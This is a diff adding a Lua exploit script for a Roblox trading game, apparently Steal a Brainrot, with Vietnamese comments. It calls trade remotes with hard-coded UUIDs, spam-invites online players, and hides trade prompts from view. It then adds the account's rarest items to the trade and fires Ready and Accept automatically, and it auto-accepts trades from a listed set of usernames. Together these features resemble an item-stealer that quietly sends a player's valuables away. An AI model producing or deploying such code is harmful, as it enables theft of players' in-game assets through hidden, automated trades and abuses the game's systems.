+    local presenceMap = {}
+    for _, p in ipairs(data.userPresences) do
+        presenceMap[p.userId] = p.userPresenceType
+    end
+
+    local onlineUsers = {}
+    for _, u in ipairs(_userCache) do
+        local pType = presenceMap[u.userId] or 0
+        local label = pType == 2 and "InGame" or pType == 1 and "Online" or "Offline"
+        print("[SAB-TRADE]", u.name, "->", label)
+        if pType == 2 then onlineUsers[#onlineUsers + 1] = u end
+    end
+
+    if #onlineUsers == 0 then return nil end
+    return onlineUsers
+end
+
+-- ============================================================
+-- Remotes (không require, không NetModule)
+-- ============================================================
+local function getRemote(label, className)
+    local children = Net:GetChildren()
+    for i, v in ipairs(children) do
+        if v.Name == label then
+            local nxt = children[i+1]
+            if nxt and nxt:IsA(className) then return nxt end
+            if v:IsA(className) then return v end
+        end
+    end
+    warn("[SAB] Remote not found:", label)
+    return nil
+end
+
+local INVITE_RF        = getRemote("RF/TradeService/Invite",           "RemoteFunction")
+local ACCEPT_INVITE_RF = getRemote("RF/TradeService/AcceptInvite",     "RemoteFunction")
+local ADD_RF           = getRemote("RF/TradeService/AddBrainrot",      "RemoteFunction")
+local READY_RE         = getRemote("RE/TradeService/Ready",            "RemoteEvent")
+local ACCEPT_RE        = getRemote("RE/TradeService/Accept",           "RemoteEvent")
+local TOGGLE_RF        = getRemote("RF/SettingsService/ToggleSetting", "RemoteFunction")
+
+local TradeUUIDs = {
+    Invite        = "afb005f9-6e81-4e0a-8bb0-3555938a9658",
+    AcceptInvite  = "57624f2b-8aa9-4974-bb7a-08f058af33ef",
+    AddBrainrot   = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda",
+    Ready         = "d73acf93-6f32-44df-b813-0f6b32c7afd9",
+    Accept        = "918ee0f5-e98f-413f-b76e-baee47b021cb",
+}
+
+-- Toggle receive trades from everyone
+if TOGGLE_RF then
+    safeSpawn(function()
+        pcall(function()
+            TOGGLE_RF:InvokeServer("Receive Trades from", "Everyone")
+        end)
+        print("[SAB-TRADE] ToggleSetting done")
+    end)
+end
+
+if not INVITE_RF then warn("[SAB-TRADE] No INVITE_RF") return end
+if not ADD_RF    then warn("[SAB-TRADE] No ADD_RF")    return end
+
+local function invitePlayer(userId)
+    if not INVITE_RF then return false end
+    local ok, res = pcall(function()
+        return INVITE_RF:InvokeServer(TradeUUIDs.Invite, userId)
+    end)
+    print("[SAB-TRADE] Invite", userId, "->", ok and tostring(res) or "fail")
+    return ok and res ~= false
+end
+
+local function spamInviteAll()
+    local result = getFirstOnlineUser()
+    if not result then
+        print("[SAB-TRADE] Không có user InGame nào")
+        return false
+    end
+
+    local onlineUsers = result
+    print("[SAB-TRADE] Invite cho", #onlineUsers, "online user...")
+
+    local startTime = os.clock()
+    while not isTradeUIOpen() do
+        if os.clock() - startTime > 15 then
+            local newResult = getFirstOnlineUser()
+            if not newResult then
+                print("[SAB-TRADE] Không còn ai InGame")
+                return false
+            end
+            onlineUsers = newResult
+            startTime = os.clock()
+        end
+
+        for _, u in ipairs(onlineUsers) do
+            if isTradeUIOpen() then break end
+            invitePlayer(u.userId)
+            local wt = safeClock()
+            repeat task.wait() until isTradeUIOpen() or safeClock() - wt > 5
+        end
+    end
+
+    return true
+end
+
+-- =======================================================================
+-- Add brainrot bằng remote
+-- =======================================================================
+local function addBrainrot(br, idx, total)
+    if not br then return false end
+
+    print(string.rep("-", 60))
+    print(string.format("[SAB-TRADE] AddBrainrot #%d/%d slot=%s %s gen=%s",
+        idx or 0, total or 0,
+        tostring(br.slotKey), tostring(br.display), tostring(br.mpsText)))
+
+    if not ADD_RF then warn("[SAB-TRADE] No ADD_RF") return false end
+
+    local payload = {
+        UUID        = br.uuid or "",
+        LastCollect = br.last or 0,
+        Index       = br.index or br.display or "",
+        OfflineGain = br.offline or 0,
+    }
+    if type(br.traits) == "table" and next(br.traits) then
+        payload.Traits = br.traits
+    end
+    if br.mutation and br.mutation ~= "None" and br.mutation ~= "" then
+        payload.Mutation = br.mutation
+    end
+
+    local ok, res = pcall(function()
+        return ADD_RF:InvokeServer(TradeUUIDs.AddBrainrot, br.slotKey, payload)
+    end)
+    print(string.format("[SAB-TRADE] AddBrainrot -> ok=%s res=%s (slot=%s)",
+        tostring(ok), tostring(res), tostring(br.slotKey)))
+
+    if ok and res ~= false then return true end
+
+    -- Retry 1 lần sau 1s
+    warn("[SAB-TRADE] Add fail, retry sau 1s...")
+    task.wait(1)
+    local ok2, res2 = pcall(function()
+        return ADD_RF:InvokeServer(TradeUUIDs.AddBrainrot, br.slotKey, payload)
+    end)
+    print(string.format("[SAB-TRADE] Retry -> ok=%s res=%s (slot=%s)",
+        tostring(ok2), tostring(res2), tostring(br.slotKey)))
+    return ok2 and res2 ~= false
+end
+
+-- đọc số slot trống của đối phương
+local function getOtherFreeSlots()
+    local ok, freeOrErr = pcall(function()
+        local gui = LP:FindFirstChild("PlayerGui")
+        local tradeRoot = gui and gui:FindFirstChild("TradeLiveTrade")
+        local tradeUI = tradeRoot and tradeRoot:FindFirstChild("TradeLiveTrade")
+        local other = tradeUI and tradeUI:FindFirstChild("Other")
+        local baseSlots = other and other:FindFirstChild("BaseSlots")
+        if not baseSlots then return nil end
+
+        local rawText = tostring(baseSlots.ContentText or baseSlots.Text or "")
+        local usedStr, maxStr = rawText:match("(%d+)%s*/%s*(%d+)")
+        if not usedStr or not maxStr then return nil end
+
+        local used = tonumber(usedStr)
+        local maxSlots = tonumber(maxStr)
+        if not used or not maxSlots then return nil end
+
+        local free = maxSlots - used
+        if free < 0 then free = 0 end
+        return free
+    end)
+
+    if not ok then
+        warn("[SAB-TRADE] Không đọc được Other.BaseSlots:", freeOrErr)
+        return nil
+    end
+    return freeOrErr
+end
+
+local function doAddBrainrots()
+    local freeSlots = getOtherFreeSlots()
+    local maxToAdd
+    if freeSlots and freeSlots > 0 then
+        maxToAdd = math.min(#brainrots, freeSlots)
+    else
+        maxToAdd = #brainrots
+    end
+
+    -- Giữ nguyên thứ tự rarity+gen từ scanBrainrots, click đúng slotKey của từng con
+    print("[SAB-TRADE] Add", maxToAdd, "brainrot theo thứ tự rarity+gen:")
+    for i = 1, maxToAdd do
+        local br = brainrots[i]
+        print(string.format("  #%d slot=%s %s gen=%s", i, tostring(br.slotKey), tostring(br.display), tostring(br.mpsText)))
+    end
+
+    for i = 1, maxToAdd do
+        if not isTradeUIOpen() then
+            warn("[SAB-TRADE] Trade UI đóng giữa chừng, dừng add.")
+            return false
+        end
+        addBrainrot(brainrots[i], i, maxToAdd)
+        task.wait(1.2)
+    end
+
+    print("[SAB-TRADE] Đã add xong", maxToAdd, "brainrot.")
+    return true
+end
+
+local function doReadyAccept()
+    print("[SAB-TRADE] Ready/Accept theo UI state...")
+    local firedReady = false
+    local firedAccept = false
+    while isTradeUIOpen() do
+        local pg = LP:FindFirstChild("PlayerGui")
+        local tlRoot = pg and pg:FindFirstChild("TradeLiveTrade")
+        local tl = tlRoot and tlRoot:FindFirstChild("TradeLiveTrade")
+        local other = tl and tl:FindFirstChild("Other")
+        local btn = other and other:FindFirstChild("ReadyButton")
+        local txt = btn and btn:FindFirstChild("Txt")
+
+        if txt and btn then
+            local text = (txt.ContentText or txt.Text or ""):upper()
+            local isGreen = (btn.BackgroundColor3 == Color3.fromRGB(81, 158, 86))
+
+            if isGreen then
+                if text == "READY" and not firedReady and READY_RE then
+                    pcall(function() READY_RE:FireServer(TradeUUIDs.Ready) end)
+                    print("[SAB-TRADE] Fire READY")
+                    firedReady = true
+                elseif text == "ACCEPT" and not firedAccept and ACCEPT_RE then
+                    pcall(function() ACCEPT_RE:FireServer(TradeUUIDs.Accept) end)
+                    print("[SAB-TRADE] Fire ACCEPT")
+                    firedAccept = true
+                end
+                task.wait(1)
+                continue
+            else
+                -- nút không còn xanh → reset để fire lại nếu xanh lại
+                if text == "READY" then firedReady = false end
+                if text == "ACCEPT" then firedAccept = false end
+            end
+        end
+
+        task.wait(0.1)
+    end
+    print("[SAB-TRADE] Trade UI đóng, kết thúc Ready/Accept")
+end
+
+-- ============================================================
+-- AUTO-ACCEPT: ẩn prompt + accept trade từ username trong list
+-- ============================================================
+do
+    local allowedSet = {}
+    for _, name in ipairs(playerList) do
+        if type(name) == "string" and name ~= "" then
+            allowedSet[name:lower()] = true
+        end
+    end
+
+    local processedLabels = {}
+
+    local function handlePrompt(inst)
+        if inst.Name ~= "Username" or not inst:IsA("TextLabel") then return end
+        if processedLabels[inst] then return end
+        processedLabels[inst] = true
+
+        local raw = (inst.ContentText or inst.Text or "")
+        if not raw:lower():find("wants to trade with you") then return end
+
+        -- extract username: "@achocohieuhoinach wants to trade with you" → "achocohieuhoinach"
+        local uname = raw:match("^@(%S+)") or raw:match("^(%S+)")
+        if not uname then return end
+
+        local promptFrame = inst:FindFirstAncestor("Prompt")
+
+        -- đẩy prompt ra ngoài màn hình thay vì hide
+        if promptFrame and promptFrame:IsA("GuiObject") then
+            promptFrame.Visible = false
+        end
+
+        -- check whitelist
+        if not allowedSet[uname:lower()] then
+            print("[SAB-TRADE] Trade từ", uname, "- không trong list, bỏ qua.")
+            return
+        end
+
+        print("[SAB-TRADE] Trade từ", uname, "- auto accept!")
+
+        -- Accept bằng remote AcceptInvite
+        safeSpawn(function()
+            local senderId = getUserIdByName(uname)
+            if senderId and ACCEPT_INVITE_RF then
+                local arg = string.format("%d-%d", senderId, LP.UserId)
+                pcall(function()
+                    ACCEPT_INVITE_RF:InvokeServer(TradeUUIDs.AcceptInvite, arg)
+                end)
+                print("[SAB-TRADE] AcceptInvite for", uname)
+            else
+                warn("[SAB-TRADE] Không lấy được senderId cho", uname)
+            end
+        end)
+    end
+
+    local playerGui = LP:FindFirstChild("PlayerGui")
+    if playerGui then
+        local function hook(root)
+            if not root then return end
+            for _, desc in ipairs(root:GetDescendants()) do
+                if desc.Name == "Prompt" and desc:IsA("GuiObject") then
+                    desc.Visible = false
+                end
+                if desc.Name == "Username" and desc:IsA("TextLabel") then
+                    safeDefer(handlePrompt, desc)
+                end
+            end
+            root.DescendantAdded:Connect(function(inst)
+                if inst.Name == "Prompt" and inst:IsA("GuiObject") then
+                    inst.Visible = false
+                end
+                if inst.Name == "Username" and inst:IsA("TextLabel") then
+                    safeDefer(handlePrompt, inst)
+                end
+            end)
+        end
+
+        local duelsRoot = playerGui:FindFirstChild("DuelsMachinePrompt")
+        if duelsRoot then
+            hook(duelsRoot:FindFirstChild("DuelsMachinePrompt") or duelsRoot)
+        end
+
+        playerGui.ChildAdded:Connect(function(child)
+            if child.Name == "DuelsMachinePrompt" then
+                hook(child:FindFirstChild("DuelsMachinePrompt") or child)
+            end
+        end)
+
+        print("[SAB-TRADE] Auto-accept listener đã bật.")
+    end
+end
+
+-- ============================================================
+-- MAIN LOOP
+-- ============================================================
+while true do
+    print(string.rep("=", 60))
+    print("[SAB-TRADE] MODE: AUTO-SEND — Bắt đầu cycle mới")
+
+    -- 1) Scan online → invite qua UI
+    local ok = spamInviteAll()
+    if not ok then
+        print("[SAB-TRADE] Re-scan...")
+        task.wait(1.5)
+        continue
+    end
+
+    print("[SAB-TRADE] Trade UI đã mở!")
+
+    -- 2) Chờ UI load
+    task.wait(2.2)
+
+    -- 3) Add brainrot qua UI click
+    if isTradeUIOpen() then
+        doAddBrainrots()
+    end
+
+    -- 4) Ready/Accept qua UI click
+    if isTradeUIOpen() then
+        doReadyAccept()
+    end
+
+    print("[SAB-TRADE] Trade cycle kết thúc. Chờ 1s rồi re-scan...")
+    task.wait(1)
+end
